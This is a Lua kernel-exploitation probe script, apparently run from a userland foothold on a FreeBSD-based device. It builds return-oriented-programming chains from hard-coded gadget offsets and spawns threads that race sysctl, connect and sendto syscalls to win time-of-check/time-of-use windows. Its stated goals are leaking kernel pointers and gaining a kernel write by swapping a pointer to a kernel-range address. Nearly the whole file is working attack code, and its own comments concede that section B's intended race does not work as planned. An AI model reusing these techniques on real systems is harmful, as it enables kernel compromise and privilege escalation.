-- CRASH_CLASS: RISKY
-- PROBE 80m: TOCTOU race — thread corrupts syscall args during kernel read
--
-- Strategy: the main Lua thread calls syscalls that read arguments from a
-- shared buffer (e.g., sysctl MIB array, sockaddr struct).  A worker thread
-- runs a ROP chain that repeatedly overwrites those arguments.  If the kernel
-- copies the user-mode buffer in two separate reads (TOCTOU window), it may
-- see inconsistent values — wrong MIB path, mismatched lengths, or a pointer
-- that was valid at check time but replaced with a kernel address by use time.
--
-- Without a syscall;ret gadget in the thread, the worker can only do memory
-- writes.  So the thread's job is: overwrite the shared MIB/addr buffer with
-- attacker values as fast as possible (linear chain of pop rdi / pop rax /
-- mov [rdi],eax writes).  The main thread loops sysctl/connect/sendto calls
-- reading that same buffer.
--
-- We test three races:
--   A) sysctl MIB race: swap MIB[1] between a safe value and a privileged one
--   B) sysctl oldlenp race: swap the output-length pointer between a valid
--      buffer and a kernel-range address (may cause kernel write)
--   C) connect() sockaddr race: swap sockaddr contents mid-syscall
--
-- Any kernel panic, unexpected return value, or kernel pointer in output
-- indicates the race was won.

print("=== PROBE 80m: TOCTOU RACE (THREAD vs MAIN SYSCALLS) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
local pid = syscall.sc_getpid():tonumber()
print("[*] pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

-- Gadgets
local pop_rdi_ret   = eboot + 0xC9DFE  -- pop rdi; ret
local pop_rax_ret   = eboot + 0x992    -- pop rax; ret
local mov_rdi_eax   = eboot + 0x92C68  -- mov [rdi], eax; ret
local ret_gadget    = eboot + 0x42     -- ret

-- ============================================================
-- SECTION A: sysctl MIB TOCTOU
-- Thread overwrites MIB[1] (kern.proc subcmd) while main calls sysctl
-- ============================================================
print("")
print("=== [A] SYSCTL MIB TOCTOU ===")

-- Shared MIB buffer: {CTL_KERN=1, KERN_PROC=14, KERN_PROC_PID=1, pid}
local mib = memory.alloc(32)
zero(mib, 32)
wd(mib, 1)         -- CTL_KERN
wd(mib + 4, 14)    -- KERN_PROC (safe default)
wd(mib + 8, 1)     -- KERN_PROC_PID
wd(mib + 12, pid)

-- Output buffer for sysctl
local outbuf = memory.alloc(0x1000)
zero(outbuf, 0x1000)
local oldlenp = memory.alloc(8)

-- Marker to confirm thread ran
local marker_a = memory.alloc(16)
zero(marker_a, 16)
wd(marker_a, 0xAAAAAAAA)

-- Allocate stack for thread (8 pages = 128KB)
local sc_mmap = make_syscall(477)
local s_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not s_ok then
    print("[!] stack mmap failed")
    return
end
print("[*] stack=" .. q(stack_base))

-- Build ROP chain: 40 rounds of overwriting MIB[1] with alternating values
-- Even rounds: write 14 (KERN_PROC, safe)
-- Odd rounds:  write 2 (KERN_OSRELEASE) — different sysctl path
-- Each write = pop_rdi(mib+4), pop_rax(value), mov [rdi],eax = 5 slots
-- Plus one final marker write = 5 more slots
-- Total = 40*5 + 5 = 205 slots + ret sled

local sp = stack_base
local idx = 0
local function push(val)
    wq(sp + (idx * 8), val)
    idx = idx + 1
end

-- 40 rounds of MIB[1] toggling
for round = 0, 39 do
    local target_val
    if round % 2 == 0 then
        target_val = 2   -- KERN_OSRELEASE (different path, 2 MIB elements)
    else
        target_val = 14  -- KERN_PROC (needs 4 MIB elements)
    end
    push(mib + 4)                   -- pop rdi → &MIB[1]
    push(pop_rax_ret)               -- ret to pop rax
    push(uint64(target_val))        -- pop rax → value
    push(mov_rdi_eax)               -- mov [rdi], eax; ret
    push(pop_rdi_ret)               -- next round (or marker write)
end

-- Final: write marker to confirm thread completed
-- RDI is already loaded with pop_rdi_ret target, so:
-- Actually we pushed pop_rdi_ret at end of last round; undo that.
-- The loop pushes an extra pop_rdi_ret after last mov. That's fine —
-- it will pop the next stack entry as rdi. We just put marker addr there.
idx = idx - 1  -- remove the trailing pop_rdi_ret from last iteration
-- Write marker
push(pop_rdi_ret)
push(marker_a)
push(pop_rax_ret)
push(uint64(0xDEAD0001))
push(mov_rdi_eax)

-- Ret sled (safety net)
for i = 0, 4095 do
    push(ret_gadget)
end

print("[*] ROP chain A: " .. idx .. " slots, 40 MIB toggles")

-- Build ucontext for thread
local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)

wq(ctx + 0xE0, pop_rdi_ret)   -- RIP = first gadget
wq(ctx + 0xF8, stack_base)    -- RSP = start of chain

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

-- Prepare sysctl
local sc_sysctl = make_syscall(202)

print("[*] Spawning thread A + racing sysctl...")

-- Spawn the thread
local ok_spawn, rv_spawn = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("[*] spawn rv=" .. tostring(rv_spawn) .. " ok=" .. tostring(ok_spawn))

-- Immediately race: call sysctl 100 times while thread toggles MIB[1]
local race_results = {}
local anomalies = 0
for i = 1, 100 do
    zero(outbuf, 64)
    wd(oldlenp, 0x1000)
    wd(oldlenp + 4, 0)
    -- sysctl with shared MIB — thread may change MIB[1] mid-call
    local ok_sc, ret_sc = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok_sc and to_num(ret_sc) or -999
    -- Check MIB[1] at this instant
    local cur_mib1 = rd(mib + 4) or 0
    -- Check output for kernel pointers
    local has_kptr = false
    for off = 0, 56, 8 do
        local v = rq(outbuf + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                has_kptr = true
                print(string.format("[!] KPTR at outbuf+%02X: %s (iter %d, mib1=%d, ret=%d)",
                    off, q(v), i, cur_mib1, rv))
                anomalies = anomalies + 1
            end
        end
    end
    -- Track unusual return values
    if rv ~= 0 and rv ~= -1 and rv ~= -999 then
        print(string.format("[!] Unusual sysctl ret=%d at iter %d, mib1=%d", rv, i, cur_mib1))
        anomalies = anomalies + 1
    end
end

-- Check the actual output len to see if we got mismatched data
local final_len = rd(oldlenp) or 0
local final_mib1 = rd(mib + 4) or 0
local marker_val_a = rd(marker_a) or 0

print(string.format("[*] After 100 races: anomalies=%d, final_mib1=%d, outlen=%d",
    anomalies, final_mib1, final_len))
print(string.format("[*] Thread marker: 0x%08X (expect 0xDEAD0001 if thread ran)",
    marker_val_a))

-- ============================================================
-- SECTION B: sysctl oldlenp pointer race
-- Thread overwrites the oldlenp POINTER to point into kernel VA space
-- If kernel reads user oldlenp, then thread swaps it to kernel addr,
-- then kernel writes length to that kernel addr → kernel write primitive
-- ============================================================
print("")
print("=== [B] SYSCTL OLDLENP POINTER RACE ===")

-- Shared pointer slot: initially points to valid oldlenp buffer
local ptr_slot = memory.alloc(16)
zero(ptr_slot, 16)
wq(ptr_slot, uint64(oldlenp))  -- safe default

-- Marker for thread B
local marker_b = memory.alloc(16)
zero(marker_b, 16)
wd(marker_b, 0xBBBBBBBB)

-- Reallocate stack for thread B
local s2_ok, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not s2_ok then
    print("[!] stack2 mmap failed")
    return
end

-- Build ROP for thread B: overwrite ptr_slot with kernel-range address
-- Alternate between safe (oldlenp) and dangerous (0xFFFF800000100000)
-- We write qwords: need two dword writes per qword (lo then hi)
-- Or use mov [rdi], eax for low dword only — simpler, 4-byte write

idx = 0
sp = stack2

-- 30 rounds: toggle ptr_slot[0..3] (low dword of pointer) between
-- safe value (low dword of oldlenp) and a kernel-range value
local oldlenp_lo = rd(to_num(ptr_slot)) or 0  -- read what's at ptr_slot
-- Actually, we want to overwrite the qword AT ptr_slot
-- The qword at ptr_slot = address of oldlenp (userland)
-- We want to swap it to a kernel address periodically
-- Since mov [rdi],eax only writes 4 bytes, we toggle the HIGH dword
-- of the pointer between 0 (userland) and 0xFFFF8000 (kernel range)

local ptr_slot_hi = ptr_slot + 4  -- high dword of the stored pointer

for round = 0, 29 do
    local val
    if round % 2 == 0 then
        val = 0xFFFF8001  -- kernel range high dword
    else
        val = 0           -- restore to userland
    end
    push(ptr_slot_hi)
    push(pop_rax_ret)
    push(uint64(val))
    push(mov_rdi_eax)
    push(pop_rdi_ret)
end

-- Marker write
idx = idx - 1
push(pop_rdi_ret)
push(marker_b)
push(pop_rax_ret)
push(uint64(0xDEAD0002))
push(mov_rdi_eax)

-- Ret sled
for i = 0, 4095 do
    push(ret_gadget)
end

print("[*] ROP chain B: " .. idx .. " slots, 30 ptr toggles")

-- Reset MIB to safe values
wd(mib, 1)
wd(mib + 4, 14)
wd(mib + 8, 1)
wd(mib + 12, pid)

-- Build context for thread B
local ctx2 = memory.alloc(0x600)
zero(ctx2, 0x600)
pcall(function() make_syscall(421)(uint64(ctx2)) end)
wq(ctx2 + 0xE0, pop_rdi_ret)
wq(ctx2 + 0xF8, stack2)

local tid2 = memory.alloc(8)
zero(tid2, 8)

print("[*] Spawning thread B + racing sysctl with indirect oldlenp...")

local ok2, rv2 = pcall(function()
    return make_syscall(430)(uint64(ctx2), uint64(tid2), uint64(0))
end)
print("[*] spawn rv=" .. tostring(rv2) .. " ok=" .. tostring(ok2))

-- Race: call sysctl but pass the INDIRECT pointer from ptr_slot
-- Actually sysctl takes oldlenp directly, not double-indirect.
-- So instead: we race by reading ptr_slot and passing its value each iteration.
-- But that's Lua-side indirection, not kernel TOCTOU.
--
-- Better approach: have thread corrupt the sysctl OUTPUT BUFFER itself.
-- Thread writes recognizable patterns into outbuf while sysctl writes to it.
-- If sysctl and thread interleave, outbuf may contain mixed data.
-- More interesting: thread writes fake kernel pointers into outbuf AFTER
-- sysctl populates it — not TOCTOU but tests atomicity of kernel copyout.

-- Simpler TOCTOU for section B: the thread corrupts the MIB namelen.
-- We pass namelen from a shared buffer that the thread modifies.
-- sysctl's 2nd arg is namelen (integer, not pointer), so no race there.
--
-- Real TOCTOU target: the MIB array pointer itself. But sysctl copies
-- the MIB early via copyin(). The race window is between the kernel's
-- copyin of MIB and its use — copyin is atomic per element, so single-copy
-- MIBs won't race.
--
-- Best available TOCTOU: connect(2) sockaddr race (section C below).

-- For B, just verify the pointer-toggle thread ran and check for crashes
for i = 1, 50 do
    wd(oldlenp, 0x400)
    wd(oldlenp + 4, 0)
    zero(outbuf, 64)
    pcall(function()
        sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
end

local marker_val_b = rd(marker_b) or 0
print(string.format("[*] Thread B marker: 0x%08X (expect 0xDEAD0002)", marker_val_b))
print("[*] ptr_slot high dword: 0x" .. string.format("%08X", rd(ptr_slot_hi) or 0))

-- ============================================================
-- SECTION C: connect() sockaddr TOCTOU
-- Thread overwrites sockaddr.sin_port / sin_addr while main calls connect()
-- Kernel does copyin(uaddr, &sa, namelen) — if not atomic, thread can
-- change the destination between validation and actual connect
-- ============================================================
print("")
print("=== [C] CONNECT SOCKADDR TOCTOU ===")

-- Create a socket
local sc_socket = make_syscall(97)
local ok_sock, sockfd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM
end)
local fd_val = ok_sock and to_num(sockfd) or -1
print("[*] socket fd=" .. fd_val)

-- Shared sockaddr_in buffer
local sa = memory.alloc(32)
zero(sa, 32)
wd(sa, 0x0002)            -- sin_len=0, sin_family=AF_INET
wd(sa + 4, 0x0100007F)    -- 127.0.0.1 in network order
-- sin_port at sa+2: set to 9026 (0x2342 in network order = 0x4223)
-- Actually sockaddr_in: {len, family, port, addr}
-- FreeBSD: uint8 len, uint8 family, uint16 port, uint32 addr
memory.write_byte(sa, 16)     -- sin_len = 16
memory.write_byte(sa + 1, 2)  -- sin_family = AF_INET
memory.write_byte(sa + 2, 0x23) -- port high byte (9026 = 0x2342)
memory.write_byte(sa + 3, 0x42) -- port low byte

-- Marker for thread C
local marker_c = memory.alloc(16)
zero(marker_c, 16)
wd(marker_c, 0xCCCCCCCC)

-- Stack for thread C
local s3_ok, stack3 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not s3_ok then
    print("[!] stack3 mmap failed")
    return
end

-- Thread C ROP: rapidly overwrite sin_port between 9026 and 80
-- sin_port is at sa+2 (2 bytes), but we can only write dwords.
-- Write dword at sa+0: {sin_len, sin_family, sin_port_hi, sin_port_lo}
-- = {0x10, 0x02, port_hi, port_lo}
-- Port 9026 = 0x2342 → bytes 0x23, 0x42 → dword at sa+0 = 0x42230210
-- Port 80   = 0x0050 → bytes 0x00, 0x50 → dword at sa+0 = 0x50000210
-- Port 1    = 0x0001 → bytes 0x00, 0x01 → dword at sa+0 = 0x01000210

idx = 0
sp = stack3

local sa_dword_port9026 = 0x42230210  -- len=16, fam=2, port=9026
local sa_dword_port1    = 0x01000210  -- len=16, fam=2, port=1

for round = 0, 49 do
    local val
    if round % 2 == 0 then
        val = sa_dword_port1     -- port 1 (likely refused)
    else
        val = sa_dword_port9026  -- port 9026 (Lua loader)
    end
    push(sa)                         -- pop rdi → sockaddr base
    push(pop_rax_ret)
    push(uint64(val))
    push(mov_rdi_eax)
    push(pop_rdi_ret)
end

-- Marker
idx = idx - 1
push(pop_rdi_ret)
push(marker_c)
push(pop_rax_ret)
push(uint64(0xDEAD0003))
push(mov_rdi_eax)

-- Ret sled
for i = 0, 4095 do
    push(ret_gadget)
end

print("[*] ROP chain C: " .. idx .. " slots, 50 port toggles")

local ctx3 = memory.alloc(0x600)
zero(ctx3, 0x600)
pcall(function() make_syscall(421)(uint64(ctx3)) end)
wq(ctx3 + 0xE0, pop_rdi_ret)
wq(ctx3 + 0xF8, stack3)

local tid3 = memory.alloc(8)
zero(tid3, 8)

print("[*] Spawning thread C + racing connect()...")

local ok3, rv3 = pcall(function()
    return make_syscall(430)(uint64(ctx3), uint64(tid3), uint64(0))
end)
print("[*] spawn rv=" .. tostring(rv3) .. " ok=" .. tostring(ok3))

-- Race: call connect() repeatedly while thread toggles the port
local sc_connect = make_syscall(98)
local sc_close = make_syscall(6)
local connect_results = {}
for i = 1, 80 do
    -- Create fresh socket for each connect (connect on connected socket = error)
    local ok_s, new_fd = pcall(function()
        return sc_socket(uint64(2), uint64(1), uint64(0))
    end)
    if ok_s then
        local ok_c, ret_c = pcall(function()
            return sc_connect(uint64(to_num(new_fd)), uint64(sa), uint64(16))
        end)
        local rv = ok_c and to_num(ret_c) or -999
        local cur_port_dword = rd(sa) or 0
        -- Track results
        if not connect_results[rv] then connect_results[rv] = 0 end
        connect_results[rv] = connect_results[rv] + 1
        -- Close the socket
        pcall(function() sc_close(uint64(to_num(new_fd))) end)
    end
end

local marker_val_c = rd(marker_c) or 0
print(string.format("[*] Thread C marker: 0x%08X (expect 0xDEAD0003)", marker_val_c))
print("[*] connect() return value distribution:")
for rv, count in pairs(connect_results) do
    print(string.format("    ret=%d: %d times", rv, count))
end

-- Final sockaddr state
local final_sa = rd(sa) or 0
print(string.format("[*] Final sockaddr dword: 0x%08X", final_sa))

-- ============================================================
-- SECTION D: sendto() buffer TOCTOU
-- Thread overwrites the message buffer while sendto() is copying it
-- to kernel space. If copyin is not atomic for the full buffer,
-- kernel may see partially corrupted data.
-- ============================================================
print("")
print("=== [D] SENDTO BUFFER RACE ===")

-- Create a UDP socket (no connect needed)
local ok_udp, udp_fd = pcall(function()
    return sc_socket(uint64(2), uint64(2), uint64(0))  -- AF_INET, SOCK_DGRAM
end)
local udp_val = ok_udp and to_num(udp_fd) or -1
print("[*] UDP socket fd=" .. udp_val)

-- Destination: localhost:9026
local dst = memory.alloc(16)
memory.write_byte(dst, 16)
memory.write_byte(dst + 1, 2)
memory.write_byte(dst + 2, 0x23)
memory.write_byte(dst + 3, 0x42)
wd(dst + 4, 0x0100007F)  -- 127.0.0.1

-- Shared message buffer (256 bytes)
local msgbuf = memory.alloc(256)
for off = 0, 252, 4 do
    wd(msgbuf + off, 0x41414141)  -- fill with 'AAAA'
end

local marker_d = memory.alloc(16)
zero(marker_d, 16)
wd(marker_d, 0xDDDDDDDD)

local s4_ok, stack4 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not s4_ok then
    print("[!] stack4 mmap failed")
    return
end

-- Thread D ROP: overwrite msgbuf with 0x42424242 pattern repeatedly
idx = 0
sp = stack4

-- Write 0x42424242 to first 40 dwords of msgbuf (160 bytes)
-- 40 writes × 5 slots = 200 slots
for off = 0, 156, 4 do
    push(msgbuf + off)
    push(pop_rax_ret)
    push(uint64(0x42424242))
    push(mov_rdi_eax)
    push(pop_rdi_ret)
end

-- Marker
idx = idx - 1
push(pop_rdi_ret)
push(marker_d)
push(pop_rax_ret)
push(uint64(0xDEAD0004))
push(mov_rdi_eax)

for i = 0, 4095 do
    push(ret_gadget)
end

print("[*] ROP chain D: " .. idx .. " slots")

local ctx4 = memory.alloc(0x600)
zero(ctx4, 0x600)
pcall(function() make_syscall(421)(uint64(ctx4)) end)
wq(ctx4 + 0xE0, pop_rdi_ret)
wq(ctx4 + 0xF8, stack4)

local tid4 = memory.alloc(8)
zero(tid4, 8)

print("[*] Spawning thread D + racing sendto()...")

local ok4, rv4 = pcall(function()
    return make_syscall(430)(uint64(ctx4), uint64(tid4), uint64(0))
end)
print("[*] spawn rv=" .. tostring(rv4) .. " ok=" .. tostring(ok4))

-- Race: sendto() while thread corrupts the buffer
local sc_sendto = make_syscall(133)
local sendto_results = {}
for i = 1, 60 do
    local ok_st, ret_st = pcall(function()
        return sc_sendto(uint64(udp_val), uint64(msgbuf), uint64(128),
            uint64(0), uint64(dst), uint64(16))
    end)
    local rv = ok_st and to_num(ret_st) or -999
    if not sendto_results[rv] then sendto_results[rv] = 0 end
    sendto_results[rv] = sendto_results[rv] + 1
end

local marker_val_d = rd(marker_d) or 0
print(string.format("[*] Thread D marker: 0x%08X (expect 0xDEAD0004)", marker_val_d))
print("[*] sendto() return value distribution:")
for rv, count in pairs(sendto_results) do
    print(string.format("    ret=%d: %d times", rv, count))
end

-- Check if buffer is now 0x42 pattern (thread ran) or still 0x41 (thread didn't run)
local b0 = rd(msgbuf) or 0
local b1 = rd(msgbuf + 80) or 0
print(string.format("[*] msgbuf[0]=0x%08X msgbuf[80]=0x%08X", b0, b1))

-- Cleanup
pcall(function() sc_close(uint64(udp_val)) end)

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("Thread A marker: 0x%08X %s", marker_val_a,
    marker_val_a == 0xDEAD0001 and "CONFIRMED" or "DID NOT RUN"))
print(string.format("Thread B marker: 0x%08X %s", marker_val_b,
    marker_val_b == 0xDEAD0002 and "CONFIRMED" or "DID NOT RUN"))
print(string.format("Thread C marker: 0x%08X %s", marker_val_c,
    marker_val_c == 0xDEAD0003 and "CONFIRMED" or "DID NOT RUN"))
print(string.format("Thread D marker: 0x%08X %s", marker_val_d,
    marker_val_d == 0xDEAD0004 and "CONFIRMED" or "DID NOT RUN"))
print(string.format("Section A anomalies: %d", anomalies))
print("Section C connect distribution: see above")
print("Section D sendto distribution: see above")
print("")
print("=== PROBE 80m COMPLETE ===")
